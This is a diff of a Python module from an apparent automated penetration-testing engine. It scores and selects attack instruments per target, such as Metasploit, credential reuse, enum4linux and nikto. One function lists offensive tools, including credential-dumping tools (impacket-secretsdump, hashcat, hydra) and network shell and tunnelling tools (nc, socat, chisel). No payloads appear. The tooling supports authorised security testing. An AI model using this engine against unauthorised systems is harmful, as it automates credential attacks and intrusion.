@@ -50,6 +50,7 @@ if str(REPO_ROOT) not in sys.path:
     sys.path.insert(0, str(REPO_ROOT))
 
 from skg.core.paths import SKG_CONFIG_DIR, SKG_HOME, SKG_STATE_DIR, DISCOVERY_DIR, EVENTS_DIR, INTERP_DIR
+from skg.identity import parse_workload_ref
 from skg.assistant.action_proposals import create_msf_action_proposal
 from skg.forge.proposals import create_action, interactive_review
 from skg.gravity import (
@@ -61,24 +62,99 @@ from skg.gravity import (
     emit_auxiliary_proposals,
     emit_follow_on_proposals,
     execute_triggered_proposals,
-    rank_instruments_for_target,
+    rank_instruments_for_node,
+    rank_instruments_for_target,  # compat alias
+    summarize_view_nodes,
     summarize_applicable_states,
 )
 from skg.kernel.engine import KernelStateEngine as _KernelStateEngine
 from skg.kernel.pearl_manifold import load_pearl_manifold
 from skg.kernel.pearls import Pearl, PearlLedger
-from datetime import datetime, timezone
-from typing import Optional
+from skg.sensors import envelope, precondition_payload
+from datetime import datetime, timezone, timedelta
+from typing import Any, Optional
 from collections import defaultdict
 from dataclasses import dataclass, field as dc_field
 import logging as _logging
 log = _logging.getLogger("skg.gravity")
+
+# Disable HuggingFace Hub network checks for model loading — the model is
+# cached locally; reaching out to HF Hub introduces 30-60 s latency or
+# fails silently when rate-limited, blocking the entire gravity cycle.
+import os as _os
+_os.environ.setdefault("TRANSFORMERS_OFFLINE", "1")
+_os.environ.setdefault("HF_DATASETS_OFFLINE", "1")
+_os.environ.setdefault("HF_HUB_OFFLINE", "1")
+
+# Suppress paramiko transport noise — SSH banner errors during credential probing
+# are expected and handled gracefully in the SSH sensor; the paramiko tracebacks
+# clutter stdout and mislead operators into thinking something crashed.
+_logging.getLogger("paramiko.transport").setLevel(_logging.CRITICAL)
+
+
+def _gravity_precondition_event(
+    *,
+    source_id: str,
+    toolchain: str,
+    wicket_id: str,
+    status: str,
+    workload_id: str,
+    detail: str,
+    evidence_rank: int,
+    source_kind: str,
+    pointer: str,
+    confidence: float,
+    run_id: str = "",
+    attack_path_id: str = "",
+    target_ip: str = "",
+    domain: str = "",
+    version: str = "0",
+    ts: str | None = None,
+    extra_payload: dict | None = None,
+) -> dict:
+    payload = precondition_payload(
+        wicket_id=wicket_id,
+        domain=domain,
+        workload_id=workload_id,
+        status=status,
+        detail=detail,
+        attack_path_id=attack_path_id,
+        target_ip=target_ip,
+    )
+    if run_id:
+        payload["run_id"] = run_id
+    if extra_payload:
+        payload.update(dict(extra_payload))
+    return envelope(
+        event_type="obs.attack.precondition",
+        source_id=source_id,
+        toolchain=toolchain,
+        payload=payload,
+        evidence_rank=evidence_rank,
+        source_kind=source_kind,
+        pointer=pointer,
+        confidence=confidence,
+        version=version,
+        ts=ts,
+    )
 
 
 def _tool_available(tool_name: str) -> bool:
     """Check if a CLI tool is available in PATH."""
     import shutil
     return shutil.which(tool_name) is not None
+
+
+def _canonical_web_runtime_available() -> bool:
+    """Check whether the service-owned web runtime path is available."""
+    try:
+        from skg_services.gravity.web_runtime import canonical_web_adapter_available
+    except Exception:
+        return False
+    try:
+        return bool(canonical_web_adapter_available())
+    except Exception:
+        return False
 
 
 def _config_file(name: str) -> Path:
@@ -118,6 +194,13 @@ _pearls = PearlLedger(PEARLS_FILE)
 # Kernel state engine — replaces last-write-wins observation with
 # support vector aggregation per the formal model (Work 3 Section 4).
 _kernel = _KernelStateEngine(DISCOVERY_DIR, EVENTS_DIR, CVE_DIR)
+
+# SQLite state mirror — fast queries without scanning NDJSON files
+try:
+    from skg.core.state_db import GravityStateDB as _GravityStateDB
+    _state_db = _GravityStateDB(SKG_STATE_DIR / "state.db")
+except Exception:
+    _state_db = None
 
 # Wicket knowledge graph — Kuramoto phase dynamics on the semantic space.
 # Provides: domain expansion signals, phase gradient gravity boosts,
@@ -300,14 +383,42 @@ def _infer_target_identity_properties(target: dict) -> dict:
 
 
 def _instrument_observation_coherence(inst_name: str, target: dict) -> float:
+    target_row = target if isinstance(target.get("target"), dict) else {}
+    if target_row:
+        view_state = dict(target_row.get("view_state") or {})
+        target = dict(target_row.get("target") or {})
+    else:
+        view_state = dict(target.get("view_state") or {})
     identity = _infer_target_identity_properties(target)
     domains = set(target.get("domains", []) or [])
+    domains.update(str(domain) for domain in (view_state.get("measured_domains") or []) if str(domain or "").strip())
+    tool_overlay = dict(view_state.get("observed_tools") or {})
+    tool_instrument_hints = {
+        {
+            "credential_reuse": "cred_reuse",
+        }.get(str(item or "").strip(), str(item or "").strip())
+        for item in (tool_overlay.get("instrument_hints") or [])
+        if str(item or "").strip()
+    }
+    tool_domain_hints = {
+        {
+            "binary": "binary_analysis",
+            "data": "data_pipeline",
+        }.get(str(item or "").strip(), str(item or "").strip())
+        for item in (tool_overlay.get("domain_hints") or [])
+        if str(item or "").strip()
+    }
+    tool_names = {
+        str(item or "").strip().lower()
+        for item in (tool_overlay.get("tool_names") or [])
+        if str(item or "").strip()
+    }
     ports = {svc.get("port") for svc in target.get("services", []) or []}
     names = set(identity.get("service_names", []) or [])
 
-    host_present = (not identity.get("host_semantics_unconfirmed")) or (22 in ports) or ("host" in domains)
-    data_present = bool(identity.get("data_semantics_present"))
-    container_present = bool(identity.get("container_semantics_present"))
+    host_present = ("host" in domains) or (not identity.get("host_semantics_unconfirmed")) or (22 in ports)
+    data_present = ("data_pipeline" in domains) or bool(identity.get("data_semantics_present"))
+    container_present = ("container_escape" in domains) or bool(identity.get("container_semantics_present"))
     interactive_present = bool(identity.get("interactive_surface_present"))
     auth_present = bool(identity.get("auth_surface_present"))
     ai_present = ("ai_target" in domains) or any(p in {11434, 6333, 7860, 8888, 5001, 4000, 6006, 8001, 9000} for p in ports)
@@ -338,12 +449,40 @@ def _instrument_observation_coherence(inst_name: str, target: dict) -> float:
             return 0.35
         return 0.0
     if inst_name == "binary_analysis":
-        return 1.0 if ("binary_analysis" in domains) else 0.0
+        if "binary_analysis" in domains:
+            return 1.0
+        if inst_name in tool_instrument_hints or "binary_analysis" in tool_domain_hints or tool_names & {"checksec", "rabin2", "r2", "ropgadget", "ltrace"}:
+            return 0.85
+        return 0.0
     if inst_name == "iot_firmware":
         return 1.0 if iot_present else 0.0
     if inst_name == "metasploit":
         if interactive_present or host_present or data_present or container_present or ai_present or iot_present:
             return 1.0
+        return 0.0
+    if inst_name == "nikto":
+        if interactive_present or "web" in domains:
+            return 1.0
+        if inst_name in tool_instrument_hints or "web" in tool_domain_hints or "nikto" in tool_names:
+            return 0.7
+        return 0.0
+    if inst_name == "searchsploit":
+        if ports:
+            return 1.0
+        if inst_name in tool_instrument_hints:
+            return 0.65
+        return 0.0
+    if inst_name == "enum4linux":
+        if host_present or "ad_lateral" in domains:
+            return 1.0
+        if inst_name in tool_instrument_hints or "ad_lateral" in tool_domain_hints or tool_names & {"enum4linux", "enum4linux-ng", "rpcclient"}:
+            return 0.7
+        return 0.0
+    if inst_name == "cred_reuse":
+        if auth_present or host_present or data_present:
+            return 1.0
+        if inst_name in tool_instrument_hints or "hydra" in tool_names:
+            return 0.6
         return 0.0
     if inst_name in {"process_probe", "boot_probe"}:
         # High coherence once SSH is available (HO-03 realized) or host domain present
@@ -365,6 +504,44 @@ def _instrument_observation_coherence(inst_name: str, target: dict) -> float:
     return 1.0
 
 
+def _observed_tool_summary(view_state: dict | None) -> str:
+    tool_overlay = dict((view_state or {}).get("observed_tools") or {})
+    tool_names = [
+        str(item or "").strip()
+        for item in (tool_overlay.get("tool_names") or [])
+        if str(item or "").strip()
+    ]
+    instrument_hints = [
+        str(item or "").strip()
+        for item in (tool_overlay.get("instrument_hints") or [])
+        if str(item or "").strip()
+    ]
+    if not tool_names and not instrument_hints:
+        return "none"
+
+    parts = []
+    if tool_names:
+        rendered_tools = []
+        for tool_name in tool_names[:8]:
+            if tool_name == "nmap" and (
+                bool(tool_overlay.get("nse_available"))
+                or any(
+                    isinstance(item, dict)
+                    and str(item.get("name") or "").strip().lower() == "nmap"
+                    and bool(item.get("nse_available"))
+                    for item in (tool_overlay.get("observed_tools") or [])
+                )
+            ):
+                count = int(tool_overlay.get("nse_script_count", 0) or 0)
+                rendered_tools.append(f"{tool_name} (NSE={count})" if count > 0 else f"{tool_name} (NSE)")
+            else:
+                rendered_tools.append(tool_name)
+        parts.append(", ".join(rendered_tools))
+    if instrument_hints:
+        parts.append(f"hints: {', '.join(instrument_hints[:8])}")
+    return "; ".join(parts)
+
+
 def _merge_configured_targets(surface: dict) -> dict:
     """
     Inject any targets declared in /etc/skg/targets.yaml that are not already
@@ -377,12 +554,22 @@ def _merge_configured_targets(surface: dict) -> dict:
     try:
         import yaml as _yaml
         data = _yaml.safe_load(targets_file.read_text()) or {}
+        # Support both list-root and dict-root targets.yaml shapes
+        if isinstance(data, list):
+            data = {"targets": data}
     except Exception:
         return surface
     existing_ips: set[str] = {t.get("ip", "") for t in surface.get("targets", [])}
     new_targets = []
     for entry in (data.get("targets") or []):
         ip = str(entry.get("host") or entry.get("ip") or "").strip()
+        # Strip URL scheme — targets.yaml host fields must be hostname/IP only
+        if "://" in ip:
+            try:
+                from urllib.parse import urlparse as _up
+                ip = _up(ip).hostname or ip
+            except Exception:
+                pass
         if not ip or ip in existing_ips:
             continue
         # Build a minimal service list from the declared services block
@@ -472,6 +659,134 @@ def _hydrate_surface_from_latest_nmap(surface_path: str) -> dict:
     return surface
 
 
+def _load_fresh_view_state(identity_key: str | None = None) -> dict:
+    try:
+        from skg.intel.surface import surface as build_surface
+
+        measured_surface = build_surface(
+            interp_dir=INTERP_DIR,
+            pearls_path=PEARLS_FILE,
+        )
+        view_nodes = list(measured_surface.get("view_nodes") or [])
+    except Exception:
+        return {}
+
+    if identity_key:
+        return summarize_view_nodes(view_nodes, identity_key=identity_key)
+
+    identities = {
+        str(row.get("identity_key") or "").strip()
+        for row in view_nodes
+        if str(row.get("identity_key") or "").strip()
+    }
+    return {
+        key: summarize_view_nodes(view_nodes, identity_key=key)
+        for key in identities
+    }
+
+
+def _synthetic_target_from_view(identity_key: str, view_state: dict | None = None) -> dict:
+    view_state = dict(view_state or {})
+    return {
+        "ip": identity_key,
+        "host": identity_key,
+        "hostname": identity_key,
+        "os": "unknown",
+        "kind": "view_node",
+        "services": [],
+        "domains": list(view_state.get("measured_domains") or []),
+        "attack_paths": [],
+        "wicket_states": {},
+        "_synthetic_from_view": True,
+    }
+
+
+def _gravity_subject_rows(surface: dict, view_state_by_identity: dict, focus_target: str | None = None) -> list[dict]:
+    def _subject_aliases(*values: str) -> set[str]:
+        aliases: set[str] = set()
+        for value in values:
+            text = str(value or "").strip()
+            if not text:
+                continue
+            aliases.add(text)
+            parsed = parse_workload_ref(text)
+            for candidate in (
+                parsed.get("identity_key"),
+                parsed.get("host"),
+                parsed.get("locator"),
+                parsed.get("manifestation_key"),
+            ):
+                candidate_text = str(candidate or "").strip()
+                if candidate_text:
+                    aliases.add(candidate_text)
+        return aliases
+
+    target_by_identity: dict[str, dict] = {}
+    for target in surface.get("targets", []) or []:
+        identity_key = str(target.get("ip") or target.get("host") or "").strip()
+        if identity_key:
+            target_by_identity[identity_key] = dict(target)
+
+    identities = set(target_by_identity.keys()) | {
+        str(identity_key or "").strip()
+        for identity_key in (view_state_by_identity or {}).keys()
+        if str(identity_key or "").strip()
+    }
+    if focus_target:
+        filtered: set[str] = set()
+        for identity_key in identities:
+            target = dict(target_by_identity.get(identity_key) or {})
+            aliases = _subject_aliases(
+                identity_key,
+                target.get("ip"),
+                target.get("host"),
+                target.get("hostname"),
+                target.get("workload_id"),
+            )
+            if focus_target in aliases:
+                filtered.add(identity_key)
+        identities = filtered
+
+    rows: list[dict] = []
+    for identity_key in sorted(identities):
+        view_state = dict((view_state_by_identity or {}).get(identity_key) or summarize_view_nodes([], identity_key=identity_key))
+        target = dict(target_by_identity.get(identity_key) or _synthetic_target_from_view(identity_key, view_state))
+        ip = str(target.get("ip") or identity_key).strip()
+        target["ip"] = ip
+        rows.append({
+            "identity_key": identity_key,
+            "ip": ip,
+            "target": target,
+            "view_state": view_state,
+        })
+    return rows
+
+
+def _fold_identity_key(fold) -> str:
+    why = dict(getattr(fold, "why", {}) or {})
+    candidates = [
+        why.get("identity_key"),
+        why.get("workload_id"),
+        why.get("host"),
+        why.get("target_ip"),
+        getattr(fold, "location", ""),
+    ]
+    for candidate in candidates:
+        text = str(candidate or "").strip()
+        if not text:
+            continue
+        identity_key = str(parse_workload_ref(text).get("identity_key") or "").strip()
+        if identity_key:
+            return identity_key
+    return ""
+
+
+def _fold_state_filename(identity_key: str) -> str:
+    # Normalise dots → underscores so 127.0.0.1 and 127_0_0_1 always map to the same file.
+    token = re.sub(r"[^A-Za-z0-9_-]+", "_", str(identity_key or "").strip()).strip("_") or "unknown"
+    return f"folds_{token}.json"
+
+
 def _load_persisted_fold_managers(folds_dir: Path) -> dict[str, object]:
     managers: dict[str, object] = {}
     try:
@@ -480,12 +795,48 @@ def _load_persisted_fold_managers(folds_dir: Path) -> dict[str, object]:
         return managers
     if not folds_dir.exists():
         return managers
-    for fold_file in folds_dir.glob("folds_*.json"):
+    # Track which canonical filenames we've already loaded to deduplicate
+    # the old dot-notation and new underscore-notation files for the same IP.
+    # Expire fold files older than 14 days — stale hosts don't benefit from
+    # accumulating un-resolvable folds across many cycles.
+    _fold_ttl = datetime.now(timezone.utc) - timedelta(days=14)
+    seen_stems: set[str] = set()
+    for fold_file in sorted(folds_dir.glob("folds_*.json"), key=lambda f: f.stat().st_mtime):
         try:
-            ip = fold_file.stem.replace("folds_", "").replace("_", ".")
+            _fmtime = datetime.fromtimestamp(fold_file.stat().st_mtime, tz=timezone.utc)
+            if _fmtime < _fold_ttl:
+                fold_file.unlink(missing_ok=True)
+                continue
+            # Normalise stem to canonical form (underscores only) for dedup
+            raw_stem = fold_file.stem.replace("folds_", "")
+            canonical_stem = re.sub(r"[^A-Za-z0-9_-]+", "_", raw_stem).strip("_")
+            if canonical_stem in seen_stems:
+                # Prefer newer file — already loaded; remove this stale duplicate
+                fold_file.unlink(missing_ok=True)
+                continue
+            seen_stems.add(canonical_stem)
             fm = FoldManager.load(fold_file)
-            if fm.all():
-                managers[ip] = fm
+            all_folds = fm.all()
+            if not all_folds:
+                continue
+            # Filter out stale CVE-derived temporal folds that are no longer
+            # being regenerated (since detect_temporal now skips CVE wickets).
+            all_folds = [
+                f for f in all_folds
+                if not (f.fold_type == "temporal" and
+                        "CVE-" in (f.constraint_source or ""))
+            ]
+            if not all_folds:
+                fold_file.unlink(missing_ok=True)
+                continue
+            identity_key = (
+                _fold_identity_key(all_folds[0])
+                or raw_stem.replace("_", ".")   # legacy dot-notation recovery
+            )
+            if identity_key not in managers:
+                managers[identity_key] = FoldManager()
+            for fold in all_folds:
+                managers[identity_key].add(fold)
         except Exception:
             continue
     return managers
@@ -510,12 +861,12 @@ class Instrument:
     wavelength: list  # What kinds of unknowns it can resolve
     cost: float       # Relative cost (1.0 = baseline HTTP request)
     available: bool = False
-    last_used_on: dict = dc_field(default_factory=dict)  # ip → timestamp
-    entropy_history: dict = dc_field(default_factory=dict)  # ip → [entropy_before, entropy_after]
+    last_used_on: dict = dc_field(default_factory=dict)  # node_key → timestamp
+    entropy_history: dict = dc_field(default_factory=dict)  # node_key → [entropy_before, entropy_after]
 
-    def failed_to_reduce(self, ip: str) -> bool:
-        """Did this instrument fail to reduce entropy on this target?"""
-        history = self.entropy_history.get(ip, [])
+    def failed_to_reduce(self, node_key: str) -> bool:
+        """Did this instrument fail to reduce entropy on this node?"""
+        history = self.entropy_history.get(node_key, [])
         if not history:
             return False
         # 999 = hard error sentinel (config missing, binary not found, etc.)
@@ -686,7 +1037,7 @@ def _get_anthropic_api_key() -> str:
     return ""
 
 
-def _create_toolchain_proposals_from_folds(active_folds_by_ip: dict, surface_path: str) -> list[str]:
+def _create_toolchain_proposals_from_folds(active_folds_by_identity: dict, surface_path: str) -> list[str]:
     try:
         from skg.forge.generator import generate_toolchain
         from skg.forge.validator import validate
@@ -696,23 +1047,23 @@ def _create_toolchain_proposals_from_folds(active_folds_by_ip: dict, surface_pat
 
     created: list[str] = []
     candidates = []
-    for ip, fold_manager in active_folds_by_ip.items():
+    for identity_key, fold_manager in active_folds_by_identity.items():
         for fold in fold_manager.all():
             if fold.fold_type not in {"structural", "contextual"}:
                 continue
             if fold.discovery_probability < 0.7:
                 continue
-            candidates.append((ip, fold))
+            candidates.append((identity_key, fold))
 
     grouped: dict[tuple[str, str, str], list] = defaultdict(list)
-    for ip, fold in candidates:
+    for identity_key, fold in candidates:
         domain = _infer_domain_from_fold(fold)
         family = _fold_service_family(fold)
-        grouped[(ip, domain, family)].append(fold)
+        grouped[(identity_key, domain, family)].append(fold)
 
     existing = forge_proposals.proposals_for_dedupe(include_archived=True)
 
-    for (ip, domain, family), folds in grouped.items():
+    for (identity_key, domain, family), folds in grouped.items():
         if not folds:
             continue
         def _fold_weight(fold) -> float:
@@ -730,7 +1081,7 @@ def _create_toolchain_proposals_from_folds(active_folds_by_ip: dict, surface_pat
             reverse=True,
         )
         top_fold = folds[0]
-        dedupe_key = f"{ip}:{domain}:{family}:{top_fold.fold_type}"
+        dedupe_key = f"{identity_key}:{domain}:{family}:{top_fold.fold_type}"
 
         if forge_proposals.is_in_cooldown(domain):
             continue
@@ -767,7 +1118,7 @@ def _create_toolchain_proposals_from_folds(active_folds_by_ip: dict, surface_pat
         gap = {
             "service": family if family != "generic" else domain,
             "attack_surface": getattr(top_fold, "detail", ""),
-            "hosts": [ip],
+            "hosts": [identity_key],
             "category": f"{top_fold.fold_type}_fold_cluster",
             "evidence": "\n".join(evidence_lines[:12]),
             "forge_ready": True,
@@ -813,7 +1164,7 @@ def _create_toolchain_proposals_from_folds(active_folds_by_ip: dict, surface_pat
     return created
 
 
-def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> list[str]:
+def _create_catalog_growth_proposals_from_folds(active_folds_by_identity: dict) -> list[str]:
     try:
         from skg.forge import proposals as forge_proposals
     except Exception:
@@ -822,7 +1173,7 @@ def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> lis
     created: list[str] = []
     existing = forge_proposals.proposals_for_dedupe(include_archived=True)
     grouped: dict[tuple[str, str, str], list] = defaultdict(list)
-    for ip, fold_manager in active_folds_by_ip.items():
+    for identity_key, fold_manager in active_folds_by_identity.items():
         for fold in fold_manager.all():
             if fold.fold_type not in {"contextual", "projection"}:
                 continue
@@ -830,9 +1181,9 @@ def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> lis
                 continue
             domain = _infer_domain_from_fold(fold)
             family = _fold_service_family(fold)
-            grouped[(ip, domain, family)].append(fold)
+            grouped[(identity_key, domain, family)].append(fold)
 
-    for (ip, domain, family), folds in grouped.items():
+    for (identity_key, domain, family), folds in grouped.items():
         if forge_proposals.is_in_cooldown(domain):
             continue
 
@@ -847,7 +1198,7 @@ def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> lis
 
         folds = sorted(folds, key=_fold_weight, reverse=True)
         top_fold = folds[0]
-        dedupe_key = f"{ip}:{domain}:catalog_growth:{family}:{top_fold.fold_type}"
+        dedupe_key = f"{identity_key}:{domain}:catalog_growth:{family}:{top_fold.fold_type}"
         if any(
             p.get("proposal_kind") == "catalog_growth"
             and p.get("domain") == domain
@@ -885,7 +1236,7 @@ def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> lis
         proposal = forge_proposals.create_catalog_growth(
             domain=domain,
             description=description,
-            hosts=[ip],
+            hosts=[identity_key],
             attack_surface=top_detail,
             evidence="\n".join(evidence_lines[:12]),
             category=category,
@@ -902,7 +1253,7 @@ def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> lis
                 continue
             if existing_proposal.get("domain") != domain:
                 continue
-            if list(existing_proposal.get("hosts", []) or []) != [ip]:
+            if list(existing_proposal.get("hosts", []) or []) != [identity_key]:
                 continue
             if existing_proposal.get("id") == proposal["id"]:
                 continue
@@ -1085,8 +1436,118 @@ def _wgraph_notify_install(installed_path: Path) -> None:
 _register_wgraph_install_hook()
 
 
+def discover_available_tools() -> dict[str, bool]:
+    """Scan PATH for all security tools SKG can use.
+
+    Returns a dict of {tool_name: available} reflecting what is actually installed
+    on this machine at runtime.  This replaces per-instrument ad-hoc `which` calls
+    with a single authoritative sweep at detect_instruments() time.
+
+    New tools installed after startup are not picked up until the next cycle that
+    calls detect_instruments() — which is acceptable given instrument lifecycles.
+    """
+    import shutil
+
+    tool_names = [
+        # Network recon
+        "nmap", "tshark", "tcpdump", "masscan", "zmap",
+        # Web enumeration
+        "nikto", "gobuster", "ffuf", "wfuzz", "feroxbuster",
+        "sqlmap", "wpscan", "nuclei", "curl", "wget",
+        # Exploitation
+        "msfconsole", "msfvenom", "searchsploit",
+        # Binary / reversing
+        "checksec", "rabin2", "r2", "radare2", "ROPgadget", "ropgadget",
+        "ltrace", "strace", "objdump", "readelf", "strings",
+        "binwalk", "ghidra", "gdb", "pwndbg", "capa",
+        # Auth / credential
+        "hydra", "john", "hashcat", "medusa", "ncrack",
+        "enum4linux", "enum4linux-ng", "rpcclient", "smbclient", "smbmap",
+        # AD / Kerberos
+        "bloodhound-python", "impacket-getTGT", "impacket-secretsdump",
+        "impacket-psexec", "kerbrute", "evil-winrm",
+        "crackmapexec", "nxc",
+        # Discovery / OSINT
+        "amass", "subfinder", "assetfinder", "naabu", "dnsx",
+        # Container / cloud
+        "docker", "kubectl", "trivy",
+        # Crypto / hash / PKI
+        "openssl", "gpg", "certipy",
+        # Packet / pcap / MitM
+        "wireshark", "responder", "bettercap",
+        # Tunneling / shells
+        "nc", "ncat", "netcat", "socat", "chisel",
+        # Language runtimes (used for scripting/payloads)
+        "python3", "ruby", "perl", "php", "go", "node",
+    ]
+
+    available: dict[str, bool] = {}
+    for tool in tool_names:
+        available[tool] = shutil.which(tool) is not None
+
+    # Python module checks — confirm runtime capabilities of sensors and adapters
+    import importlib.util
+    for pkg in [
+        "pwntools", "impacket", "paramiko", "sqlalchemy", "scapy",
+        "requests", "ldap3", "cryptography", "yaml",
+        "angr", "frida",
+    ]:
+        available[f"py:{pkg}"] = importlib.util.find_spec(pkg) is not None
+
+    log.debug("[tool_discovery] found: %s",
+              ", ".join(t for t, ok in available.items() if ok))
+    return available
+
+
+# Tool availability cache — populated once at detect_instruments() time.
+_AVAILABLE_TOOLS: dict[str, bool] = {}
+
+# Gravity adapter plugin registry — maps instrument_name → run() function.
+# Adapters live in skg-gravity/adapters/ and are loaded once at startup.
+# New instruments go here instead of into the elif dispatch chain.
+_GRAVITY_ADAPTERS: dict[str, Any] = {}
+
+
+def _load_gravity_adapters() -> None:
+    """
+    Scan skg-gravity/adapters/ for instrument plugin modules and register them.
+
+    Each adapter module must define:
+      INSTRUMENT_NAME: str  — the instrument key (matches detect_instruments())
+      run(ip, target, run_id, out_dir, result, *, authorized, node_key, **kwargs) -> dict
+
+    This decouples tool execution from the gravity physics engine.  New tools
+    are added as adapter modules, not as elif branches in the dispatch block.
+    The legacy _exec_* functions remain as fallbacks for instruments not yet
+    migrated to the adapter pattern.
+    """
+    global _GRAVITY_ADAPTERS
+    adapters_dir = Path(__file__).parent / "adapters"
+    if not adapters_dir.exists():
+        return
+    for adapter_file in sorted(adapters_dir.glob("*.py")):
+        if adapter_file.stem.startswith("_"):
+            continue
+        try:
+            mod = _load_module_from_file(
+                f"skg_gravity_adapter_{adapter_file.stem}", adapter_file
+            )
+            name = getattr(mod, "INSTRUMENT_NAME", None)
+            fn   = getattr(mod, "run", None)
+            if name and callable(fn):
+                _GRAVITY_ADAPTERS[name] = fn
+                log.debug("[adapters] loaded: %s from %s", name, adapter_file.name)
+        except Exception as exc:
+            log.debug("[adapters] failed to load %s: %s", adapter_file.name, exc)
+
+
+_load_gravity_adapters()
+
+
 def detect_instruments() -> dict:
     """Detect which instruments are available on the system."""
+    global _AVAILABLE_TOOLS
+    _AVAILABLE_TOOLS = discover_available_tools()
     instruments = {}
 
     # HTTP collector — unauthenticated web scanning
@@ -1097,7 +1558,7 @@ def detect_instruments() -> dict:
                      "WB-09", "WB-11", "WB-12", "WB-17", "WB-18", "WB-19",
                      "WB-22", "WB-24"],
         cost=1.0,
-        available=(WEB_ADAPTER / "collector.py").exists(),
+        available=_canonical_web_runtime_available(),
     )
 
     # Authenticated scanner — post-auth surface with CSRF handling
@@ -1107,18 +1568,22 @@ def detect_instruments() -> dict:
         wavelength=["WB-06", "WB-07", "WB-08", "WB-09", "WB-10", "WB-11",
                      "WB-12", "WB-13", "WB-14", "WB-15", "WB-22"],
         cost=3.0,
-        available=(WEB_ADAPTER / "auth_scanner.py").exists(),
+        available=_canonical_web_runtime_available(),
     )
 
     # ── gobuster: web directory enumeration ────────────────────────────────
+    # Available when binary present, or when the adapter exists with Python fallback
+    # (requests is stdlib-compatible via urllib when requests pkg not present)
+    _gobuster_adapter = (SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active" / "gobuster_adapter.py").exists()
     instruments["gobuster"] = Instrument(
         name="gobuster",
         description="Web directory/file enumeration — discovers hidden paths, admin panels, backup files",
         wavelength=[
-            "WB-03", "WB-04", "WB-15", "WB-17", "WB-20",
+            "WB-03", "WB-04", "WB-05", "WB-08", "WB-09",
+            "WB-14", "WB-15", "WB-17", "WB-20",
         ],
         cost=1.5,
-        available=True,  # uses built-in wordlist fallback
+        available=_gobuster_adapter,  # adapter has Python fallback when binary absent
     )
 
     # ── sqlmap: SQL injection exploitation ─────────────────────────────────
@@ -1178,8 +1643,7 @@ def detect_instruments() -> dict:
     )
 
     # Metasploit — exploitation framework
-    msf_available = bool(subprocess.run(
-        ["which", "msfconsole"], capture_output=True).returncode == 0)
+    msf_available = _AVAILABLE_TOOLS.get("msfconsole", False)
     instruments["metasploit"] = Instrument(
         name="metasploit",
         description="Metasploit auxiliary/exploit modules — can bypass app-layer defenses",
@@ -1190,8 +1654,7 @@ def detect_instruments() -> dict:
     )
 
     # Tshark/pcap — network-layer observation
-    tshark_available = bool(subprocess.run(
-        ["which", "tshark"], capture_output=True).returncode == 0)
+    tshark_available = _AVAILABLE_TOOLS.get("tshark", False) or _AVAILABLE_TOOLS.get("tcpdump", False)
     instruments["pcap"] = Instrument(
         name="pcap",
         description="Packet capture — observes interactions from the wire, bypasses app-layer opacity",
@@ -1211,18 +1674,20 @@ def detect_instruments() -> dict:
     )
 
     # Nmap — network scanner
-    nmap_available = bool(subprocess.run(
-        ["which", "nmap"], capture_output=True).returncode == 0)
+    nmap_available = _AVAILABLE_TOOLS.get("nmap", False)
     instruments["nmap"] = Instrument(
         name="nmap",
         description="Network scanner — service detection, version fingerprinting, NSE scripts",
-        wavelength=["WB-01", "WB-02", "WB-17", "HO-*"],
+        wavelength=["WB-01", "WB-02", "WB-17", "HO-*", "AD-01", "AD-16", "CE-04", "CE-01", "DP-01"],
         cost=3.0,
         available=nmap_available,
     )
 
-    # BloodHound — AD domain enumeration via BloodHound CE REST API or Neo4j
-    # Wavelength: all AD lateral wickets (kerberoastable, delegation, ACLs, etc.)
+    # BloodHound — AD domain enumeration via BloodHound CE REST API or Neo4j.
+    # Canonical delegation ownership note:
+    #   - AD-06/AD-08 posture are canonical domain slices.
+    #   - AD-07 is routed as service context sidecar (not canonical AD-domain wicket output).
+    #   - AD-09 remains deferred/non-canonical.
     # Availability: requires BH CE running on localhost:8080 or Neo4j on 7687
     bh_url = os.environ.get("BH_URL", "http://localhost:8080")
     bh_user = os.environ.get("BH_USERNAME", "admin")
@@ -1238,9 +1703,13 @@ def detect_instruments() -> dict:
             bh_available = False
     instruments["bloodhound"] = Instrument(
         name="bloodhound",
-        description="BloodHound CE — AD object graph: kerberoastable, ACLs, delegation, stale DAs",
+        description=(
+            "BloodHound CE — AD object graph for canonical AD slices; "
+            "delegation canonical coverage is AD-06/AD-08 posture only; "
+            "legacy delegation paths are compatibility-only"
+        ),
         wavelength=["AD-01", "AD-02", "AD-03", "AD-04", "AD-05",
-                     "AD-06", "AD-07", "AD-08", "AD-09", "AD-10",
+                     "AD-06", "AD-08", "AD-10",
                      "AD-11", "AD-12", "AD-13", "AD-14", "AD-15",
                      "AD-16", "AD-17", "AD-18", "AD-19", "AD-20",
                      "AD-21", "AD-22", "AD-23", "AD-24", "AD-25"],
@@ -1260,12 +1729,7 @@ def detect_instruments() -> dict:
         data_sources_configured = bool((_ds_cfg or {}).get("data_sources"))
     except Exception:
         data_sources_configured = False
-    try:
-        import importlib.util
-        spec = importlib.util.find_spec("sqlalchemy")
-        sqlalchemy_available = spec is not None
-    except Exception:
-        sqlalchemy_available = False
+    sqlalchemy_available = _AVAILABLE_TOOLS.get("py:sqlalchemy", False)
     instruments["data_profiler"] = Instrument(
         name="data_profiler",
         description="DB profiler — schema, completeness, freshness, drift, integrity for data pipelines",
@@ -1283,12 +1747,7 @@ def detect_instruments() -> dict:
     # Directed toward DE-* wickets; works without pre-configured data_sources.yaml
     # Available whenever the adapter script exists and paramiko is installed
     db_discovery_path = SKG_HOME / "skg-data-toolchain" / "adapters" / "db_discovery" / "parse.py"
-    try:
-        import importlib.util as _ilu
-        _pko = _ilu.find_spec("paramiko")
-        _paramiko_ok = _pko is not None
-    except Exception:
-        _paramiko_ok = False
+    _paramiko_ok = _AVAILABLE_TOOLS.get("py:paramiko", False)
     instruments["db_discovery"] = Instrument(
         name="db_discovery",
         description="SSH DB discovery — enumerate MySQL/PG/Mongo/Redis, test default and harvested creds, check bind/auth config",
@@ -1298,13 +1757,12 @@ def detect_instruments() -> dict:
         available=db_discovery_path.exists() and _paramiko_ok,
     )
 
-    # Binary analysis — checksec, rabin2, radare2, ROPgadget, pwndbg
-    # Directed toward BA-* wickets when binary integrity unknowns are high-entropy
